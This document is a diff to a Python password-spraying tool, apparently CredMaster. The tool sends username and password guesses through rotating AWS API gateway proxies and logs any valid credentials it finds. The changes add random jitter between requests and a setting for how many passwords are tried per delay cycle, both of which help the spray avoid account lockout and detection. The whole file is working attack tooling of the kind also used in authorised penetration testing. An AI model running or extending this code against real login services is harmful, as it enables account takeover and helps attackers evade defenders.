@@ -45,6 +45,8 @@ def main(args,pargs):
 	url = ""
 	delay = args.delay
 	outfile = args.outfile
+	passwordsperdelay = args.passwordsperdelay
+	jitter = args.jitter
 
 
 	pluginargs = {}
@@ -77,6 +79,7 @@ def main(args,pargs):
 
 	log_entry("Starting Spray...")
 
+	count = 0
 	passwords = load_file(password_file)
 	for password in passwords:
 
@@ -84,25 +87,30 @@ def main(args,pargs):
 
 		# Start Spray
 		with ThreadPoolExecutor(max_workers=len(apis)) as executor:
-			i = 0
 			for api_key in apis:
 				#log_entry('Launching spray using {}...'.format())
-				i += 1
 				executor.submit(
 					spray_thread,
 					api_key = api_key,
 					api_dict = apis[api_key],
 					plugin = plugin,
-					number = i
+					jitter = jitter
 				)
 
+		count = count + 1
+
 		if delay == None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
+			log_entry('Completed spray with password {} at {}'.format(password, datetime.datetime.utcnow()))
+			continue
+		elif count != passwordsperdelay:
+			log_entry('Completed spray with password {} at {}, moving on to next password...'.format(password, datetime.datetime.utcnow()))
 			continue
 		else:
 			log_entry('Completed spray with password {} at {}, sleeping for {} minutes before next password spray'.format(password, datetime.datetime.utcnow(), delay))
 			log_entry('Valid credentials discovered: {}'.format(len(results)))
 			for success in results:
 				log_entry('Valid: {}:{}'.format(success['username'], success['password']))
+			count = 0
 			time.sleep(delay * 60)
 
 	done = True
@@ -192,13 +200,13 @@ def destroy_apis(access_key, secret_access_key, profile_name, session_token):
 		fp.delete_api(args["api_id"])
 
 
-def spray_thread(api_key, api_dict, plugin, number):
+def spray_thread(api_key, api_dict, plugin, jitter=None):
 	global results
 	try:
 		plugin_authentiate = getattr(importlib.import_module('plugins.{}.{}'.format(plugin, plugin)), '{}_authenticate'.format(plugin))
 	except Exception as ex:
-		log_entry("Error: Failed to import plugin with exception")
-		log_entry("Error: {}".format(ex))
+		log_entry("Error: Failed to import plugin with exception", thread_region=api_key)
+		log_entry("Error: {}".format(ex), thread_region=api_key)
 		exit()
 
 	while not q_spray.empty():
@@ -206,19 +214,22 @@ def spray_thread(api_key, api_dict, plugin, number):
 		try:
 			cred = q_spray.get_nowait()
 
+			if jitter is not None:
+				time.sleep(random.randint(0,jitter))
+
 			response = plugin_authentiate(api_dict['proxy_url'], cred['username'], cred['password'], cred['useragent'])
 
 			if not response['error']:
-				log_entry("{}: {}".format(api_key,response['output']), thread_number=number)
+				log_entry("{}: {}".format(api_key,response['output']), thread_region=api_key)
 			else:
-				log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],response['output']))
+				log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],response['output']), thread_region=api_key)
 
 			if response['success']:
 				results.append( {'username' : cred['username'], 'password' : cred['password']} )
 
 			q_spray.task_done()
 		except Exception as ex:
-			log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],ex))
+			log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],ex), thread_region=api_key)
 
 
 def load_credentials(user_file, password, useragent_file=None):
@@ -246,18 +257,18 @@ def load_file(filename):
 		return [line.strip() for line in open(filename, 'r')]
 
 
-def log_entry(entry, thread_number=None):
+def log_entry(entry, thread_region=None):
 	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
 	print('[{}] {}'.format(ts, entry))
 
 	if outfile is not None:
-		if thread_number == None:
+		if thread_region == None:
 			with open(outfile + "-credmaster.txt", 'a+') as file:
 				file.write('[{}] {}'.format(ts, entry))
 				file.write('\n')
 				file.close()
 		else:
-			with open(outfile + "-credmaster-" + str(thread_number) + '.txt', 'a+') as file:
+			with open(outfile + "-credmaster-" + thread_region + '.txt', 'a+') as file:
 				file.write('[{}] {}'.format(ts, entry))
 				file.write('\n')
 				file.close()
@@ -266,16 +277,26 @@ def log_entry(entry, thread_number=None):
 if __name__ == '__main__':
 
 	parser = argparse.ArgumentParser()
-	parser.add_argument('--plugin', help='spraying plugin', required=True)
-	parser.add_argument('-t', '--threads', help='thread count (default: 1)', type=int, default=1)
-	parser.add_argument('-u', '--userfile', help='username file', required=True)
-	parser.add_argument('-p', '--passwordfile', help='password file', required=True)
-	parser.add_argument('-a', '--useragentfile', help='useragent file', required=False)
-	parser.add_argument('-o', '--outfile', help='output file to write contents', default=None, required=False)
-	parser.add_argument('-d', '--delay', type=int, help='delay between unique passwords, in minutes', required=False)
-	parser.add_argument('--profile_name', help='AWS Profile Name to store/retrieve credentials', type=str, default=None)
-	parser.add_argument('--access_key', help='AWS Access Key', type=str, default=None)
-	parser.add_argument('--secret_access_key', help='AWS Secret Access Key', type=str, default=None)
-	parser.add_argument('--session_token', help='AWS Session Token', type=str, default=None)
+	parser.add_argument('--plugin', help='Spray plugin', required=True)
+	parser.add_argument('-t', '--threads', type=int, default=1, help='Thread count (default: 1)')
+	parser.add_argument('-u', '--userfile', required=True, help='Username file')
+	parser.add_argument('-p', '--passwordfile', required=True, help='Password file')
+	parser.add_argument('-a', '--useragentfile', required=False, help='Useragent file')
+	parser.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents')
+	parser.add_argument('-j', '--jitter', type=int, default=None, required=False, help='Jitter delay between requests in seconds (applies per-thread)')
+	parser.add_argument('-d', '--delay', type=int, required=False, help='Delay between unique passwords, in minutes')
+	parser.add_argument('--passwordsperdelay', type=int, default=1, required=False, help='Number of passwords to be tested per delay cycle')
+	parser.add_argument('--profile_name', type=str, default=None, help='AWS Profile Name to store/retrieve credentials')
+	parser.add_argument('--access_key', type=str, default=None, help='AWS Access Key')
+	parser.add_argument('--secret_access_key', type=str, default=None, help='AWS Secret Access Key')
+	parser.add_argument('--session_token', type=str, default=None, help='AWS Session Token')
 	args,pluginargs = parser.parse_known_args()
+
+
+	#if (not args.access_key or not args.secret_access_key):
+
+
+
+
+
 	main(args,pluginargs)
